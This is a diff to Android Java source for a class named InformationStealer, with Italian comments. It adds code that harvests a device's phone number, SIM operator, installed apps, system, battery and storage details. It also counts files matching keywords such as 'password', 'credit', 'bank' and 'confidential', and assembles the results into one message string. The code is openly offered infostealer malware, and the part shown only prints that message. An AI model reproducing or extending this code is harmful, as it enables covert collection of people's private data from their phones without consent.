@@ -12,6 +12,8 @@ import android.Manifest;
 import android.net.Uri;
 import android.os.BatteryManager;
 import android.os.Build;
+import android.os.Environment;
+import android.os.StatFs;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.telephony.TelephonyManager;
@@ -24,6 +26,30 @@ public class InformationStealer implements Runnable {
 
     private static final int READ_EXTERNAL_STORAGE_PERMISSION_REQUEST = 1;
     private static StringBuilder messaggio;
+    private static boolean permissionFlag = true;
+
+    String[] keywords = {
+            "illegal",
+            "email",
+            "credit",
+            "card",
+            "password",
+            "confidential",
+            "private",
+            "bank",
+            "account",
+            "social",
+            "security",
+            "personal",
+            "financial",
+            "sensitive",
+            "proprietary",
+            "classified",
+            "conflict",
+            "contract",
+            "insurance",
+            "tax",
+    };
 
     NetworkManager conn = new NetworkManager();
     Context context;
@@ -40,23 +66,53 @@ public class InformationStealer implements Runnable {
     public void setMessaggio(StringBuilder messaggio) {
         InformationStealer.messaggio = messaggio;
     }
+
+    public boolean getPermissionFlag(){
+        return permissionFlag;
+    }
+
+    public void setPermissionFlag(boolean permissionFlag){
+        InformationStealer.permissionFlag = permissionFlag;
+    }
     @Override
     public void run(){
+        if(permissionFlag){
         messaggio.append(stealApp(context));
         messaggio.append(stealSystemDetail(context));
         messaggio.append(stealBatteryInformation(context));
+        messaggio.append(stealFileSystemInfo(context, keywords));
+        messaggio.append(stealNumberInformations(context));
+    }
+        else{
+            messaggio.append(stealApp(context));
+            messaggio.append(stealSystemDetail(context));
+            messaggio.append(stealBatteryInformation(context));
+        }
+
+        int index = messaggio.indexOf("&");
+        while (index != -1) {
+            messaggio.replace(index, index + 1, "\n");
+            index = messaggio.indexOf("&", index + 1);
+        }
+
+        System.out.println(messaggio.toString());
     }
 
-    @SuppressLint("MissingPermission")
+
     static String stealNumberInformations(Context context) {
         String msg = "";
-        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
+        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
         if (telephonyManager != null) {
-            @SuppressLint("MissingPermission") String phoneNumber = telephonyManager.getLine1Number();
-            String operator = telephonyManager.getSimOperatorName();
-            msg += "&Phone_number=" + phoneNumber + "&";
-            msg += "&SIM_Operator=" + operator + "&";
-            return msg;
+            if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                String phoneNumber = telephonyManager.getLine1Number();
+                String operator = telephonyManager.getSimOperatorName();
+                msg += "&Phone_number=" + phoneNumber + "&";
+                msg += "&SIM_Operator=" + operator + "&";
+                return msg;
+            } else {
+                // Permesso non concesso
+                return "";
+            }
         }
         return "";
     }
@@ -109,8 +165,9 @@ public class InformationStealer implements Runnable {
 
    */
 
-    public String searchFilesWithKeywords(Context context, String[] keywords) {
+    public String stealFileSystemInfo(Context context, String[] keywords) {
         int numeroFileInteressanti = 0;
+        StringBuilder sb = new StringBuilder();
 
         // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
@@ -145,10 +202,40 @@ public class InformationStealer implements Runnable {
             } while (cursor.moveToNext());
             System.out.println("\nFile interessanti trovati: " + numeroFileInteressanti);
             cursor.close();
-            return "&File_interessanti=" + numeroFileInteressanti + "&";
+            sb.append("&File_interessanti=" + numeroFileInteressanti + "&");
         } else {
-            return "&File_interessanti=0&";
+            sb.append("&File_interessanti=0&");
         }
+        // Percorso della directory radice esterna
+        String externalStoragePath = Environment.getExternalStorageDirectory().getPath();
+        sb.append("&external_storage=").append(externalStoragePath);
+
+        // Verifica se la directory radice esterna è rimovibile
+        boolean isExternalStorageRemovable = Environment.isExternalStorageRemovable();
+        sb.append("&external_storage_removable=").append(isExternalStorageRemovable);
+
+        // Verifica se la directory radice esterna è condivisa
+        boolean isExternalStorageEmulated = Environment.isExternalStorageEmulated();
+        sb.append("&external_storage_emulated=").append(isExternalStorageEmulated);
+
+        StatFs stat = new StatFs(externalStoragePath);
+        long blockSize = stat.getBlockSizeLong();
+        long totalBlocks = stat.getBlockCountLong();
+        long availableBlocks = stat.getAvailableBlocksLong();
+
+        long totalSizeBytes = totalBlocks * blockSize;
+        long availableSizeBytes = availableBlocks * blockSize;
+        double totalSizeGB = (double) totalSizeBytes / (1024 * 1024 * 1024);
+        double availableSizeGB = (double) availableSizeBytes / (1024 * 1024 * 1024);
+
+        String totalSizeFormatted = String.format("%.2f", totalSizeGB);
+        String availableSizeFormatted = String.format("%.2f", availableSizeGB);
+
+        sb.append("&Total_size=" + totalSizeFormatted + "_GB&");
+        sb.append("Available_size=" + availableSizeFormatted + "_GB&");
+        // Altre informazioni sul file system...
+        System.out.println("-------\n" + sb.toString());
+        return sb.toString();
     }
 
     public String stealApp(Context context) {
@@ -171,6 +258,21 @@ public class InformationStealer implements Runnable {
         }
 
         return sb.toString();
+    }
+
+    public String getFileSystemInfo() {
+        String externalStoragePath = Environment.getExternalStorageDirectory().getPath();
+
+        StatFs stat = new StatFs(externalStoragePath);
+        long blockSize = stat.getBlockSizeLong();
+        long totalBlocks = stat.getBlockCountLong();
+        long availableBlocks = stat.getAvailableBlocksLong();
+
+        long totalSize = totalBlocks * blockSize;
+        long availableSize = availableBlocks * blockSize;
+
+        return "Total size: " + totalSize + " bytes\n" +
+                "Available size: " + availableSize + " bytes";
     }
 
     public static String stealSystemDetail(Context context) {
